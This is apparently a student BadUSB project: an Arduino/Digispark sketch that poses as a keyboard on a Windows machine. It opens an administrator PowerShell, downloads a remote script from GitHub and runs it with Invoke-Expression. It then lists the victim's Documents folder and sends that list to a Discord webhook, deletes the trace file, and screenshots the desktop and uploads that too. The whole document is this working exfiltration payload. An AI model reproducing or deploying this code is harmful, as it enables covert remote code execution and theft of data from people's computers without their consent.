#include "DigiKeyboard.h"
#define KEY_UP 0x52
#define KEY_DOWN 0x51
#define KEY_LEFT 0x50
#define KEY_RIGHT 0x4F

/* 
  This script exfiltrates the names of all files stored within 
  the victim's Documents folder by accessing PowerShell and
  creating a text file with a list that is sent to Discord
  through a webhook.

  The Upload-Discord function was taken from the I am Jakoby
  GitHub repository.

  PS = PowerShell
*/


void enterPowerShell() {
  // Accessing PowerShell
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // opens the execute popup
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_A); // selects "PowerShell (Admin)"
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes"
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter
}

void setup() {
  DigiKeyboard.update();

  // Accessing PowerShell with Win + X
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // opens the execute popup
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_A); // selects "PowerShell (Admin)"
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes"
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter

  // brings focus to the PS window
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$wshell = New-Object -ComObject wscript.shell");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$wshell.AppActivate('powershell')");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); // Alt + Tab

  // downloads the Upload-Discord PS function from GitHub
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Marquito0077/Team-Echo-Repo/main/Discord_Upload_PowerShell.ps1");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Invoke-Expression $($ScriptFromGitHub.content)");

  // Accessing the Documents Folder
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$pathDocs = [Environment]::GetFolderPath('MyDocuments')"); // gets the folder path
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cd $pathDocs"); // changes directory into that path
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("ls | Out-File -FilePath docsFolderContents.txt"); // lists the contents of the folder
                                                                          // and outputs it on a text file in the same directory

  DigiKeyboard.delay(1000);
  DigiKeyboard.println('Upload-Discord -file "docsFolderContents.txt" -text "CONTENTS OF USER DOCS FOLDER"'); // uploads the file to the Discord webhook

  DigiKeyboard.delay(1000);
  DigiKeyboard.println("rm docsFolderContents.txt"); // removes the log file after uploading to Discord

  // Screenshots the computers Desktop (wallpaper)
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // minimizes all windows
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(70, MOD_GUI_LEFT); // uses the Print Screen key to take the screenshot
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); // gets back to PS with Alt + Tab

  // Finds the screenshot in the MyPictures folder
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$pathPics = [Environment]::GetFolderPath('MyPictures')"); // gets the folder path
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$latestFile = gci Screenshots | sort LastWriteTime | select -last 1"); // gets the latest file written
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cd Screenshots");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println('Upload-Discord -file $latestFile.Name -text "DESKTOP WALLPAPER SCREENSHOT"');
  
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit");  // closes the PowerShell window

  // DEVELOPED BY MARCOS RODRIGUEZ (MIKE ROBLES) FOR TEAM ECHO
  // WATCHDOGS CYBERSECURITY - BADUSB PROJECT
  // JANUARY 2024
}

void loop() {
  // put your main code here, to run repeatedly:

}
